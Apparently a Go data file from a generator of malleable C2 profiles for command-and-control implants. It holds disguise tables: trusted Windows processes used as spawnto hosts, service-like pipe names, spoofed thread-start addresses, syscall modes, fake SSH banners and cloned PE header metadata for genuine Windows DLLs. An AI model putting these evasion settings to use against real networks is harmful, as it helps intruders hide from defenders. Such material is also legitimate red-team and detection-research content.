package Struct

var Profile_Names = []string{
	``,
	`WindowsUpdate`,
	`Slack`,
	`Gotomeeting`,
	`Outlook.Live`,
	`Safebrowsing`,
	`AzureEdge`,
	`Field-Keyword`,
	`Custom`}

var Post_EX_Process_Name = []string{`
	set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
	set spawnto_x64 "%windir%\\sysnative\\WerFault.exe"; 
`, `
	set spawnto_x86 "%windir%\\syswow64\\WWAHost.exe";
	set spawnto_x64 "%windir%\\sysnative\\WWAHost.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\choice.exe";
	set spawnto_x64 "%windir%\\sysnative\\choice.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\bootcfg.exe";
	set spawnto_x64 "%windir%\\sysnative\\bootcfg.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\dtdump.exe";
	set spawnto_x64 "%windir%\\sysnative\\dtdump.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\expand.exe";
	set spawnto_x64 "%windir%\\sysnative\\expand.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\fsutil.exe";
	set spawnto_x64 "%windir%\\sysnative\\fsutil.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\gpresult.exe";
	set spawnto_x64 "%windir%\\sysnative\\gpresult.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\logman.exe";
	set spawnto_x64 "%windir%\\sysnative\\logman.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\mcbuilder.exe";
	set spawnto_x64 "%windir%\\sysnative\\mcbuilder.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\mtstocom.exe";
	set spawnto_x64 "%windir%\\sysnative\\mtstocom.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\pcaui.exe";
	set spawnto_x64 "%windir%\\sysnative\\pcaui.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\powercfg.exe";
	set spawnto_x64 "%windir%\\sysnative\\powercfg.exe";
`, `
	set spawnto_x86 "%windir%\\syswow64\\svchost.exe";
	set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
`}

var Pipename_list = []string{
	"SapIServerPipes-1-##",
	"epmapper-##",
	"atsvc-##",
	"plugplay+##",
	"srvsvc-1-5-5-0_##",
	"W32TIME_ALT_##",
	"tapsrv_##",
	"Printer_Spools_##",
}

var Thread_list = []string{
	"ucrtbase.dll!configthreadlocale+0x",
	"combase.dll!InternalTlsAllocData+0x",
	"ntdll.dll!TpReleaseCleanupGroupMemembers+0x",
	"ntdll.dll!ZwWaitForSingleObjectEx+0x",
	"ntdll.dll!RtlUserThreadStart+0x",
	"sechost.dll!WaitServiceState+0x",
	"sechost.dll!StartServiceCtrlDispatcherW+0x",
	"svchost.exe!WaitServiceState+0x",
	"kernel32.dll!BaseThreadInitThunk+0x",
}

var Syscall_Method = []string{
	"None",
	"Direct",
	"Indirect",
}

var Magic_PE = []string{
	"AXAP",
	"AZAR",
	"A[AS",
	"A\\\\AT",
	"A]AU",
	"A^AV",
	"A_AW",
}

var SSH_Banner = []string{
	"Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)",
	"Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)",
	"Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.3.0-1035-aws x86_64)",
	"Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)",
	"OpenSSH_7.4 Debian (protocol 2.0)",
	"OpenSSH_8.6 Debian (protocol 2.0)",
	"OpenSSH_7. Debian (protocol 2.0)",
	"OpenSSH_7.4 Debian (protocol 2.0)",
}

var Peclone_list = []string{`
set checksum       "717619";
set compile_time   "28 Mar 2101 20:42:06";
set entry_point    "223696";
set image_size_x86 "679936";
set image_size_x64 "679936";
set name           "ActivationManager.dll";
set rich_header    "\xa5\xe5\x05\x4a\xe1\x84\x6b\x19\xe1\x84\x6b\x19\xe1\x84\x6b\x19\xe8\xfc\xf8\x19\x4c\x84\x6b\x19\xf5\xef\x68\x18\xe9\x84\x6b\x19\xf5\xef\x6f\x18\xfb\x84\x6b\x19\xe1\x84\x6a\x19\xd1\x82\x6b\x19\xf5\xef\x6a\x18\xe9\x84\x6b\x19\xf5\xef\x6b\x18\xe0\x84\x6b\x19\xf5\xef\x65\x18\xb7\x84\x6b\x19\xf5\xef\x6e\x18\xff\x84\x6b\x19\xf5\xef\x96\x19\xe0\x84\x6b\x19\xf5\xef\x94\x19\xe0\x84\x6b\x19\xf5\xef\x69\x18\xe0\x84\x6b\x19\x52\x69\x63\x68\xe1\x84\x6b\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1930882";
set compile_time   "08 Aug 1976 22:34:44";
set entry_point    "905152";
set image_size_x86 "1908736";
set image_size_x64 "1908736";
set name           "audioeng.dll";
set rich_header    "\x66\x9f\xd4\x63\x22\xfe\xba\x30\x22\xfe\xba\x30\x22\xfe\xba\x30\x36\x95\xb9\x31\x28\xfe\xba\x30\x36\x95\xbe\x31\x2d\xfe\xba\x30\x36\x95\xbb\x31\x26\xfe\xba\x30\x2b\x86\x29\x30\x41\xfe\xba\x30\x22\xfe\xbb\x30\x53\xfb\xba\x30\x36\x95\xba\x31\x23\xfe\xba\x30\x36\x95\xb4\x31\x01\xff\xba\x30\x36\x95\xbf\x31\x3e\xfe\xba\x30\x36\x95\x47\x30\x23\xfe\xba\x30\x36\x95\x45\x30\x23\xfe\xba\x30\x36\x95\xb8\x31\x23\xfe\xba\x30\x52\x69\x63\x68\x22\xfe\xba\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1309288";
set compile_time   "13 Jun 2029 04:04:37";
set entry_point    "877248";
set image_size_x86 "1347584";
set image_size_x64 "1347584";
set name           "AzureSettingSyncProvider.DLL";
set rich_header    "\x49\x0f\xf5\x64\x0d\x6e\x9b\x37\x0d\x6e\x9b\x37\x0d\x6e\x9b\x37\x04\x16\x08\x37\x61\x6e\x9b\x37\x19\x05\x98\x36\x04\x6e\x9b\x37\x0d\x6e\x9a\x37\xaf\x6f\x9b\x37\x19\x05\x9a\x36\x04\x6e\x9b\x37\x19\x05\x9e\x36\x15\x6e\x9b\x37\x19\x05\x9f\x36\x4f\x6e\x9b\x37\x19\x05\x9b\x36\x0c\x6e\x9b\x37\x19\x05\x92\x36\x77\x6e\x9b\x37\x19\x05\x64\x37\x0c\x6e\x9b\x37\x19\x05\x99\x36\x0c\x6e\x9b\x37\x52\x69\x63\x68\x0d\x6e\x9b\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "6985379";
set compile_time   "27 Mar 2094 19:17:55";
set entry_point    "5586624";
set image_size_x86 "6950912";
set image_size_x64 "6950912";
set name           "BingMaps.dll";
set rich_header    "\x3b\x53\x7d\x55\x7f\x32\x13\x06\x7f\x32\x13\x06\x7f\x32\x13\x06\x76\x4a\x80\x06\x19\x32\x13\x06\x6b\x59\x10\x07\x73\x32\x13\x06\x6b\x59\x17\x07\x70\x32\x13\x06\x7f\x32\x12\x06\xcd\x37\x13\x06\x6b\x59\x12\x07\x6c\x32\x13\x06\x6b\x59\x13\x07\x7e\x32\x13\x06\x6b\x59\x1a\x07\xc8\x33\x13\x06\x6b\x59\x16\x07\x5e\x32\x13\x06\x6b\x59\xee\x06\x7e\x32\x13\x06\x6b\x59\xec\x06\x7e\x32\x13\x06\x6b\x59\x11\x07\x7e\x32\x13\x06\x52\x69\x63\x68\x7f\x32\x13\x06\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "398105";
set compile_time   "11 Apr 2029 18:35:06";
set entry_point    "264064";		
set compile_time   "26 Mar 2011 12:53:09";
set entry_point    "258048";
set image_size_x86 "1122304";
set image_size_x64 "1122304";
set name           "DIAGCPL.dll";
set rich_header    "\x52\x82\x23\xb2\x16\xe3\x4d\xe1\x16\xe3\x4d\xe1\x16\xe3\x4d\xe1\x02\x88\x49\xe0\x03\xe3\x4d\xe1\x02\x88\x4e\xe0\x15\xe3\x4d\xe1\x02\x88\x48\xe0\x15\xe3\x4d\xe1\x16\xe3\x4c\xe1\xff\xe2\x4d\xe1\x02\x88\x4c\xe0\x35\xe3\x4d\xe1\x02\x88\x4d\xe0\x17\xe3\x4d\xe1\x02\x88\x45\xe0\x27\xe3\x4d\xe1\x02\x88\xb2\xe1\x17\xe3\x4d\xe1\x02\x88\x4f\xe0\x17\xe3\x4d\xe1\x52\x69\x63\x68\x16\xe3\x4d\xe1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "26291599";
set compile_time   "30 Jun 2071 19:09:00";
set entry_point    "5578048";
set image_size_x86 "26411008";
set image_size_x64 "26411008";
set name           "EDGEHTML.dll";
set rich_header    "\x57\xdf\x63\x23\x13\xbe\x0d\x70\x13\xbe\x0d\x70\x13\xbe\x0d\x70\x1a\xc6\x9e\x70\xdb\xbe\x0d\x70\x07\xd5\x0e\x71\x17\xbe\x0d\x70\x13\xbe\x0c\x70\x16\xb9\x0d\x70\x07\xd5\x0c\x71\x1c\xbe\x0d\x70\x07\xd5\x08\x71\x05\xbe\x0d\x70\x07\xd5\x09\x71\x98\xbe\x0d\x70\x07\xd5\x0d\x71\x12\xbe\x0d\x70\x07\xd5\x00\x71\xa8\xb1\x0d\x70\x07\xd5\xf2\x70\x12\xbe\x0d\x70\x07\xd5\x0f\x71\x12\xbe\x0d\x70\x52\x69\x63\x68\x13\xbe\x0d\x70\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "327597";
set compile_time   "08 Oct 2014 07:55:29";
set entry_point    "76608";
set image_size_x86 "311296";
set image_size_x64 "311296";
set name           "FILEMGMT.DLL";
set rich_header    "\xc9\x32\x31\x5c\x8d\x53\x5f\x0f\x8d\x53\x5f\x0f\x8d\x53\x5f\x0f\x99\x38\x5c\x0e\x89\x53\x5f\x0f\x99\x38\x5b\x0e\x9e\x53\x5f\x0f\x99\x38\x5e\x0e\x98\x53\x5f\x0f\x8d\x53\x5e\x0f\xbe\x51\x5f\x0f\x99\x38\x5a\x0e\x87\x53\x5f\x0f\x99\x38\x5f\x0e\x8c\x53\x5f\x0f\x99\x38\x51\x0e\xb6\x53\x5f\x0f\x99\x38\xa0\x0f\x8c\x53\x5f\x0f\x99\x38\x5d\x0e\x8c\x53\x5f\x0f\x52\x69\x63\x68\x8d\x53\x5f\x0f\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "323973";
set compile_time   "05 Sep 2093 14:25:32";
set entry_point    "238272";
set image_size_x86 "327680";
set image_size_x64 "327680";
set name           "FIREWALLCONTROLPANEL.dll";
set rich_header    "\x62\x54\xcc\x5c\x26\x35\xa2\x0f\x26\x35\xa2\x0f\x26\x35\xa2\x0f\x2f\x4d\x31\x0f\x60\x35\xa2\x0f\x32\x5e\xa1\x0e\x22\x35\xa2\x0f\x32\x5e\xa6\x0e\x31\x35\xa2\x0f\x32\x5e\xa7\x0e\x2f\x35\xa2\x0f\x26\x35\xa3\x0f\x1b\x37\xa2\x0f\x32\x5e\xa3\x0e\x31\x35\xa2\x0f\x32\x5e\xa2\x0e\x27\x35\xa2\x0f\x32\x5e\xab\x0e\x0b\x35\xa2\x0f\x32\x5e\x5d\x0f\x27\x35\xa2\x0f\x32\x5e\xa0\x0e\x27\x35\xa2\x0f\x52\x69\x63\x68\x26\x35\xa2\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1351672";
set compile_time   "14 Jul 2081 14:16:28";
set entry_point    "160064";
set image_size_x86 "1368064";
set image_size_x64 "1368064";
set name           "GPSVC.dll";
set rich_header    "\x49\xf1\x6f\x1f\x0d\x90\x01\x4c\x0d\x90\x01\x4c\x0d\x90\x01\x4c\x04\xe8\x92\x4c\x5b\x90\x01\x4c\x19\xfb\x02\x4d\x0e\x90\x01\x4c\x0d\x90\x00\x4c\xfb\x91\x01\x4c\x19\xfb\x00\x4d\x06\x90\x01\x4c\x19\xfb\x04\x4d\x01\x90\x01\x4c\x19\xfb\x05\x4d\x19\x90\x01\x4c\x19\xfb\x01\x4d\x0c\x90\x01\x4c\x19\xfb\x0c\x4d\x96\x90\x01\x4c\x19\xfb\xfe\x4c\x0c\x90\x01\x4c\x19\xfb\x03\x4d\x0c\x90\x01\x4c\x52\x69\x63\x68\x0d\x90\x01\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "250984";
set compile_time   "11 Feb 2078 05:07:28";
set entry_point    "96336";
set name           "gpupvdev.dll";
set rich_header    "\x71\xf3\x1c\xe1\x35\x92\x72\xb2\x35\x92\x72\xb2\x35\x92\x72\xb2\x21\xf9\x73\xb3\x37\x92\x72\xb2\x3c\xea\xe1\xb2\x02\x92\x72\xb2\x35\x92\x73\xb2\x48\x96\x72\xb2\x21\xf9\x76\xb3\x3c\x92\x72\xb2\x21\xf9\x71\xb3\x36\x92\x72\xb2\x21\xf9\x72\xb3\x34\x92\x72\xb2\x21\xf9\x7a\xb3\x3d\x92\x72\xb2\x21\xf9\x77\xb3\x2b\x92\x72\xb2\x21\xf9\x8f\xb2\x34\x92\x72\xb2\x21\xf9\x8d\xb2\x34\x92\x72\xb2\x21\xf9\x70\xb3\x34\x92\x72\xb2\x52\x69\x63\x68\x35\x92\x72\xb2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1741697";
set compile_time   "31 Mar 2020 14:08:56";
set entry_point    "948912";
set image_size_x86 "1716224";
set image_size_x64 "1716224";
set name           "libcrypto.dll";
set rich_header    "\xf4\x6e\xae\xe7\xb0\x0f\xc0\xb4\xb0\x0f\xc0\xb4\xb0\x0f\xc0\xb4\xd5\x69\xc4\xb5\xba\x0f\xc0\xb4\xd5\x69\xc3\xb5\xb6\x0f\xc0\xb4\xd5\x69\xc5\xb5\x1c\x0f\xc0\xb4\x2e\xaf\x07\xb4\xb7\x0f\xc0\xb4\xe2\x67\xc5\xb5\xae\x0f\xc0\xb4\xe2\x67\xc4\xb5\xbf\x0f\xc0\xb4\xe2\x67\xc3\xb5\xb9\x0f\xc0\xb4\xb9\x77\x53\xb4\x85\x0f\xc0\xb4\xb0\x0f\xc1\xb4\x38\x0f\xc0\xb4\x2b\x66\xc4\xb5\x82\x0d\xc0\xb4\x2b\x66\xc3\xb5\xbf\x0f\xc0\xb4\x2b\x66\xc0\xb5\xb1\x0f\xc0\xb4\x2b\x66\x3f\xb4\xb1\x0f\xc0\xb4\xb0\x0f\x57\xb4\xb1\x0f\xc0\xb4\x2b\x66\xc2\xb5\xb1\x0f\xc0\xb4\x52\x69\x63\x68\xb0\x0f\xc0\xb4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "132564";
set compile_time   "08 Oct 2004 06:45:39";
set entry_point    "19840";
set name           "srvcli.dll";
set rich_header    "\x31\xe1\x11\x7c\x75\x80\x7f\x2f\x75\x80\x7f\x2f\x75\x80\x7f\x2f\x61\xeb\x7e\x2e\x77\x80\x7f\x2f\x7c\xf8\xec\x2f\x58\x80\x7f\x2f\x75\x80\x7e\x2f\xea\x84\x7f\x2f\x61\xeb\x7c\x2e\x74\x80\x7f\x2f\x61\xeb\x7b\x2e\x7f\x80\x7f\x2f\x61\xeb\x7f\x2e\x74\x80\x7f\x2f\x61\xeb\x72\x2e\x58\x80\x7f\x2f\x61\xeb\x7a\x2e\x65\x80\x7f\x2f\x61\xeb\x82\x2f\x74\x80\x7f\x2f\x61\xeb\x80\x2f\x74\x80\x7f\x2f\x61\xeb\x7d\x2e\x74\x80\x7f\x2f\x52\x69\x63\x68\x75\x80\x7f\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "328248";
set compile_time   "26 Jun 2065 19:36:37";
set entry_point    "16240";
set image_size_x86 "335872";
set image_size_x64 "335872";
set name           "srvsvc.dll";
set rich_header    "\x05\x47\xfc\xc1\x41\x26\x92\x92\x41\x26\x92\x92\x41\x26\x92\x92\x55\x4d\x93\x93\x45\x26\x92\x92\x48\x5e\x01\x92\x10\x26\x92\x92\x41\x26\x93\x92\x7d\x23\x92\x92\x55\x4d\x96\x93\x4b\x26\x92\x92\x55\x4d\x91\x93\x43\x26\x92\x92\x55\x4d\x92\x93\x40\x26\x92\x92\x55\x4d\x9f\x93\x7d\x26\x92\x92\x55\x4d\x97\x93\x53\x26\x92\x92\x55\x4d\x6f\x92\x40\x26\x92\x92\x55\x4d\x6d\x92\x40\x26\x92\x92\x55\x4d\x90\x93\x40\x26\x92\x92\x52\x69\x63\x68\x41\x26\x92\x92\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "664082";
set compile_time   "15 May 2075 06:23:45";
set entry_point    "187552";
set image_size_x86 "643072";
set image_size_x64 "643072";
set name           "Windows.Storage.Search.dll";
set rich_header    "\x70\xb5\x96\x9c\x34\xd4\xf8\xcf\x34\xd4\xf8\xcf\x34\xd4\xf8\xcf\x3d\xac\x6b\xcf\x40\xd4\xf8\xcf\x20\xbf\x05\xcf\x23\xd4\xf8\xcf\x20\xbf\xfc\xce\x2f\xd4\xf8\xcf\x20\xbf\xfd\xce\x36\xd4\xf8\xcf\x34\xd4\xf9\xcf\x66\xd6\xf8\xcf\x20\xbf\xf9\xce\x3d\xd4\xf8\xcf\x20\xbf\xfb\xce\x33\xd4\xf8\xcf\x20\xbf\xf8\xce\x35\xd4\xf8\xcf\x20\xbf\xf6\xce\x5c\xd4\xf8\xcf\x20\xbf\x07\xcf\x35\xd4\xf8\xcf\x20\xbf\xfa\xce\x35\xd4\xf8\xcf\x52\x69\x63\x68\x34\xd4\xf8\xcf\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "299753";
set compile_time   "24 Jun 1984 09:44:59";
set entry_point    "244672";
set image_size_x86 "315392";
set image_size_x64 "315392";
set name           "Windows.System.Diagnostics.dll";
set rich_header    "\x2e\x58\xbc\xf0\x6a\x39\xd2\xa3\x6a\x39\xd2\xa3\x6a\x39\xd2\xa3\x63\x41\x41\xa3\x03\x39\xd2\xa3\x7e\x52\xd1\xa2\x69\x39\xd2\xa3\x7e\x52\xd6\xa2\x65\x39\xd2\xa3\x6a\x39\xd3\xa3\x3b\x3c\xd2\xa3\x7e\x52\xd3\xa2\x62\x39\xd2\xa3\x7e\x52\xd2\xa2\x6b\x39\xd2\xa3\x7e\x52\xdb\xa2\x47\x39\xd2\xa3\x7e\x52\xd7\xa2\x77\x39\xd2\xa3\x7e\x52\x2f\xa3\x6b\x39\xd2\xa3\x7e\x52\x2d\xa3\x6b\x39\xd2\xa3\x7e\x52\xd0\xa2\x6b\x39\xd2\xa3\x52\x69\x63\x68\x6a\x39\xd2\xa3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "809225";
set compile_time   "27 Jul 2082 08:34:13";
set entry_point    "519664";
set image_size_x86 "774144";
set image_size_x64 "774144";
set name           "Windows.System.Launcher.dll";
set rich_header    "\xdf\xfc\x35\x37\x9b\x9d\x5b\x64\x9b\x9d\x5b\x64\x9b\x9d\x5b\x64\x92\xe5\xc8\x64\xeb\x9d\x5b\x64\x8f\xf6\x58\x65\x98\x9d\x5b\x64\x8f\xf6\x5f\x65\x89\x9d\x5b\x64\x9b\x9d\x5a\x64\xb8\x9c\x5b\x64\x8f\xf6\x5a\x65\x92\x9d\x5b\x64\x8f\xf6\x5e\x65\x97\x9d\x5b\x64\x8f\xf6\x5b\x65\x9a\x9d\x5b\x64\x8f\xf6\x53\x65\x81\x9d\x5b\x64\x8f\xf6\xa4\x64\x9a\x9d\x5b\x64\x8f\xf6\x59\x65\x9a\x9d\x5b\x64\x52\x69\x63\x68\x9b\x9d\x5b\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "263876";
set compile_time   "21 Jul 2003 14:15:10";
set entry_point    "179728";
set name           "Windows.System.SystemManagement.dll";
set rich_header    "\xab\xb4\x71\xb4\xef\xd5\x1f\xe7\xef\xd5\x1f\xe7\xef\xd5\x1f\xe7\xe6\xad\x8c\xe7\x9e\xd5\x1f\xe7\xfb\xbe\x1c\xe6\xe9\xd5\x1f\xe7\xfb\xbe\x1b\xe6\xe1\xd5\x1f\xe7\xef\xd5\x1e\xe7\x8c\xd0\x1f\xe7\xfb\xbe\x1e\xe6\xe7\xd5\x1f\xe7\xfb\xbe\x1f\xe6\xee\xd5\x1f\xe7\xfb\xbe\x16\xe6\xc7\xd5\x1f\xe7\xfb\xbe\x1a\xe6\xf1\xd5\x1f\xe7\xfb\xbe\xe2\xe7\xee\xd5\x1f\xe7\xfb\xbe\xe0\xe7\xee\xd5\x1f\xe7\xfb\xbe\x1d\xe6\xee\xd5\x1f\xe7\x52\x69\x63\x68\xef\xd5\x1f\xe7\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "393009";
set compile_time   "04 Jan 2037 11:02:03";
set entry_point    "237072";
set image_size_x86 "380928";
set image_size_x64 "380928";
set name           "Windows.UI.BioFeedback.dll";
set rich_header    "\xc9\x8a\xc6\x41\x8d\xeb\xa8\x12\x8d\xeb\xa8\x12\x8d\xeb\xa8\x12\x84\x93\x3b\x12\xb5\xeb\xa8\x12\x99\x80\xab\x13\x8e\xeb\xa8\x12\x99\x80\xac\x13\x87\xeb\xa8\x12\x8d\xeb\xa9\x12\x63\xef\xa8\x12\x99\x80\xa9\x13\x8a\xeb\xa8\x12\x99\x80\xa8\x13\x8c\xeb\xa8\x12\x99\x80\xa1\x13\x81\xeb\xa8\x12\x99\x80\xad\x13\xae\xeb\xa8\x12\x99\x80\x55\x12\x8c\xeb\xa8\x12\x99\x80\x57\x12\x8c\xeb\xa8\x12\x99\x80\xaa\x13\x8c\xeb\xa8\x12\x52\x69\x63\x68\x8d\xeb\xa8\x12\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "442600";
set compile_time   "05 Aug 2033 07:05:57";
set entry_point    "259936";
set image_size_x86 "434176";
set image_size_x64 "434176";
set name           "Windows.UI.BlockedShutdown.dll";
set rich_header    "\xec\x0c\xe9\x21\xa8\x6d\x87\x72\xa8\x6d\x87\x72\xa8\x6d\x87\x72\xa1\x15\x14\x72\x94\x6d\x87\x72\xbc\x06\x84\x73\xab\x6d\x87\x72\xbc\x06\x83\x73\xa2\x6d\x87\x72\xa8\x6d\x86\x72\x8a\x68\x87\x72\xbc\x06\x86\x73\xa1\x6d\x87\x72\xbc\x06\x87\x73\xa9\x6d\x87\x72\xbc\x06\x8e\x73\xa5\x6d\x87\x72\xbc\x06\x82\x73\x8b\x6d\x87\x72\xbc\x06\x7a\x72\xa9\x6d\x87\x72\xbc\x06\x78\x72\xa9\x6d\x87\x72\xbc\x06\x85\x73\xa9\x6d\x87\x72\x52\x69\x63\x68\xa8\x6d\x87\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "733746";
set compile_time   "01 Jul 2091 22:01:31";
set entry_point    "610752";
set image_size_x86 "729088";
set image_size_x64 "729088";
set name           "Windows.UI.Core.TextInput.DLL";
set rich_header    "\xcf\xa6\x1b\x17\x8b\xc7\x75\x44\x8b\xc7\x75\x44\x8b\xc7\x75\x44\x82\xbf\xe6\x44\xd5\xc7\x75\x44\x9f\xac\x76\x45\x8c\xc7\x75\x44\x9f\xac\x71\x45\x98\xc7\x75\x44\x8b\xc7\x74\x44\x84\xc6\x75\x44\x9f\xac\x74\x45\x80\xc7\x75\x44\x9f\xac\x70\x45\x85\xc7\x75\x44\x9f\xac\x75\x45\x8a\xc7\x75\x44\x9f\xac\x7c\x45\xc4\xc7\x75\x44\x9f\xac\x8a\x44\x8a\xc7\x75\x44\x9f\xac\x77\x45\x8a\xc7\x75\x44\x52\x69\x63\x68\x8b\xc7\x75\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "926377";
set compile_time   "10 Jul 2019 14:32:11";
set entry_point    "672064";
set image_size_x86 "897024";
set image_size_x64 "897024";
set name           "winsqlite3.dll";
set rich_header    "\x86\xdf\xa4\x64\xc2\xbe\xca\x37\xc2\xbe\xca\x37\xc2\xbe\xca\x37\xf9\xe0\xc9\x36\xc4\xbe\xca\x37\xf9\xe0\xcf\x36\xd4\xbe\xca\x37\xf9\xe0\xce\x36\xcc\xbe\xca\x37\xcb\xc6\x59\x37\xf1\xbe\xca\x37\xc2\xbe\xcb\x37\xba\xbe\xca\x37\x55\xe0\xce\x36\xc3\xbe\xca\x37\x55\xe0\xca\x36\xc3\xbe\xca\x37\x50\xe0\x35\x37\xc3\xbe\xca\x37\x55\xe0\xc8\x36\xc3\xbe\xca\x37\x52\x69\x63\x68\xc2\xbe\xca\x37\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1134746";
set compile_time   "26 Jun 2021 18:31:54";
set entry_point    "244784";
set image_size_x86 "1224704";
set image_size_x64 "1224704";
set name           "WMNetMgr.DLL";
set rich_header    "\x99\xde\x8b\xfc\xdd\xbf\xe5\xaf\xdd\xbf\xe5\xaf\xdd\xbf\xe5\xaf\xc9\xd4\xe6\xae\xd6\xbf\xe5\xaf\xc9\xd4\xe1\xae\xcb\xbf\xe5\xaf\xdd\xbf\xe4\xaf\xa2\xbe\xe5\xaf\xc9\xd4\xe4\xae\xd0\xbf\xe5\xaf\xc9\xd4\xe0\xae\xd5\xbf\xe5\xaf\xc9\xd4\xe5\xae\xdc\xbf\xe5\xaf\xc9\xd4\xeb\xae\x15\xbf\xe5\xaf\xc9\xd4\x1a\xaf\xdc\xbf\xe5\xaf\xc9\xd4\xe7\xae\xdc\xbf\xe5\xaf\x52\x69\x63\x68\xdd\xbf\xe5\xaf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "475685";
set compile_time   "10 Nov 2015 18:25:50";
set entry_point    "50064";
set image_size_x86 "471040";
set image_size_x64 "471040";
set name           "wwanapi.dll";
set rich_header    "\x8b\x47\x1f\x57\xcf\x26\x71\x04\xcf\x26\x71\x04\xcf\x26\x71\x04\xc6\x5e\xe2\x04\x89\x26\x71\x04\xdb\x4d\x72\x05\xca\x26\x71\x04\xdb\x4d\x75\x05\xdb\x26\x71\x04\xcf\x26\x70\x04\x09\x26\x71\x04\xdb\x4d\x70\x05\xca\x26\x71\x04\xdb\x4d\x74\x05\xc3\x26\x71\x04\xdb\x4d\x71\x05\xce\x26\x71\x04\xdb\x4d\x7f\x05\xac\x26\x71\x04\xdb\x4d\x8e\x04\xce\x26\x71\x04\xdb\x4d\x73\x05\xce\x26\x71\x04\x52\x69\x63\x68\xcf\x26\x71\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, ` 
set checksum       "1540872";
set compile_time   "23 May 2072 01:26:12";
set entry_point    "887952";
set image_size_x86 "1544192";
set image_size_x64 "1544192";
set name           "WWANSVC.DLL";
set rich_header    "\xec\xba\xa6\xda\xa8\xdb\xc8\x89\xa8\xdb\xc8\x89\xa8\xdb\xc8\x89\xa1\xa3\x5b\x89\x2c\xdb\xc8\x89\xbc\xb0\xcc\x88\xa7\xdb\xc8\x89\xbc\xb0\xcb\x88\xab\xdb\xc8\x89\xa8\xdb\xc9\x89\x78\xde\xc8\x89\xbc\xb0\xc9\x88\xa5\xdb\xc8\x89\xbc\xb0\xc8\x88\xa9\xdb\xc8\x89\xbc\xb0\xc0\x88\x2f\xdb\xc8\x89\xbc\xb0\xcd\x88\x88\xdb\xc8\x89\xbc\xb0\x35\x89\xa9\xdb\xc8\x89\xbc\xb0\x37\x89\xa9\xdb\xc8\x89\xbc\xb0\xca\x88\xa9\xdb\xc8\x89\x52\x69\x63\x68\xa8\xdb\xc8\x89\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
`, `
set checksum       "564120";
set compile_time   "08 Sep 2007 15:58:23";
set entry_point    "64272";
set image_size_x86 "536576";
set image_size_x64 "536576";
set name           "wow64win.dll";
